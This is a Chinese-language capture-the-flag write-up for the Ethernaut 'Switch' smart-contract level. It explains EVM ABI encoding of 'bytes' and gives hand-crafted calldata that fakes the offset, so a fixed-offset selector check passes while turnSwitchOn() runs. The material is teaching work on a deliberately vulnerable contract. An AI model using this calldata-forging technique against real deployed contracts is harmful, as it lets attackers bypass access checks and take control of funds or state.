# Switch

## 题目描述

[原题 in Sepolia](https://ethernaut.openzeppelin.com/level/0xb2aBa0e156C905a9FAEc24805a009d99193E3E53)

打开合约中的开关。turn Switch On

## 运行

根据[Foundry 官方文档](https://getfoundry.sh/)配置好运行环境后，于本项目下执行下列命令：

```sh
$ cd WTF-CTF

$ forge test -C src/Ethernaut/Switch -vvvvv
```

## 功能简述

本题主要涉及`EVM`中对于`bytes`类型的编码。

`EVM`可以看作256位的虚拟机，每次取数据都取32字节(64个16进制位)数据。

如果调用`Switch`合约以关闭开关，我们需要构造的`calldata`如下

```hex
0x30c13ade 																											 // flipSwitch(bytes)
0000000000000000000000000000000000000000000000000000000000000020 // 位置信息
0000000000000000000000000000000000000000000000000000000000000004 // 长度信息
20606e1500000000000000000000000000000000000000000000000000000000 // turnSwitchOff()
```

`Switch`合约中的修饰器`onlyOff`通过查看`calldata`中的第68字节开始的4个字节的数据(即 20606e15)。来保证只能关闭开关。

至于为什么只查看第68字节开始的4个字节的数据。是因为`EVM`在编码`bytes`动态类型的数据时，添加了位置和长度信息（而位置和长度信息默认是连续且分别占据32个字节）。位置信息表示长度信息所在位置（基于bytes变量的偏移量），长度信息表示内容所占字节数量（bytes内容紧接长度信息后）。

而`Switch`合约中`flipSwitch`函数内部通过`call`调用自身函数时的`_data`是外部传入的，也就是说是可以伪造的。只需要保证伪造后`_data`的第68字节开始的4个字节是`turnSwitchOff()`的函数选择器即可。

所以，我们构造如下的`calldata`

```
0x30c13ade                                                           // flipSwitch(bytes)
0000000000000000000000000000000000000000000000000000000000000060     // 位置信息
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff     // 占位符, 内容无所谓，只需占32字节
20606e1500000000000000000000000000000000000000000000000000000000     // turnSwitchOff()
0000000000000000000000000000000000000000000000000000000000000004     // 长度信息
76227e1200000000000000000000000000000000000000000000000000000000     // turnSwitchOn()
```

这样，保证了第68字节开始的4个字节是`turnSwitchOff()`的函数选择器。

此外`EVM`在解码bytes变量时，首先找位置信息0x60，即bytes变量的长度在0x60的偏移量位置（即 6 * 16个字节，从0开始计数）。长度信息为0x04，（即 4个字节），内容为0x76227e12。

通过伪造编码，骗过`Switch`合约对bytes类型的刻板编码印象。

此外，可以阅读[Solidity Tutorial : all about Bytes](https://jeancvllr.medium.com/solidity-tutorial-all-about-bytes-9d88fdb22676)和[Solidity Tutorial: All About Calldata](https://betterprogramming.pub/solidity-tutorial-all-about-calldata-aebbe998a5fc)，获取更多关于bytes类型和calldata的内容。